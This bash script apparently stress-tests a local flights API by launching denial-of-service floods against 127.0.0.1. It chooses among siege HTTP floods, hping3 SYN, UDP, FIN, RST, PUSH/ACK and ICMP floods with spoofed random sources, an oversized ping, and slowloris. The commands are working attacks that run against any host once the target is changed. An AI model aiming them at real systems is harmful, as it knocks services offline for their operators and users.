echo "arg = " $1

#HTTP flood:
if [[ $1 == "http" ]]; then
echo "http-flood enabled"
    siege -c 500 -r 3000 'http://127.0.0.1/flights/all' -H 'Content-Type: application/json'
fi

#TCP SYN flood
if [[ $1 == "tcp-syn" ]]; then
echo "tcp-syn enabled"
    docker run utkudarilmaz/hping3 --rand-source -S -q -n --flood 127.0.0.1 -p 80
fi

#UDP flood:
if [[ $1 == "udp" ]]; then
echo "udp enabled"
    docker run utkudarilmaz/hping3 --rand-source --udp --flood 127.0.0.1 -p 80 
fi

#TCP FIN Flood
if [[ $1 == "tcp-fin" ]]; then
echo "tcp-fin enabled"
    docker run utkudarilmaz/hping3 --rand-source -F --flood 127.0.0.1 -p 80 
fi

#TCP RST Flood
if [[ $1 == "tcp-rst" ]]; then
echo "tcp-rst enabled"
    docker run utkudarilmaz/hping3 --rand-source -R --flood 127.0.0.1 -p 80  
fi

#PUSH and ACK Flood
if [[ $1 == "push-n-ack" ]]; then
echo "push-n-ack enabled"
    docker run utkudarilmaz/hping3 --rand-source -PA --flood 127.0.0.1 -p 80  
fi

#ICMP Flood
if [[ $1 == "icmp" ]]; then
echo "icmp enabled"
    docker run utkudarilmaz/hping3 --rand-source -1 --flood 127.0.0.1 -p 80 
fi

#Ping of death
if [[ $1 == "pod" ]]; then
echo "Ping of death enabled"
    ping -s 65535 127.0.0.1
fi

#Ping of death
if [[ $1 == "slowloris" ]]; then
echo "slowloris enabled"
    python3 ./slowloris/slowloris.py 127.0.0.1 -s 100000
fi
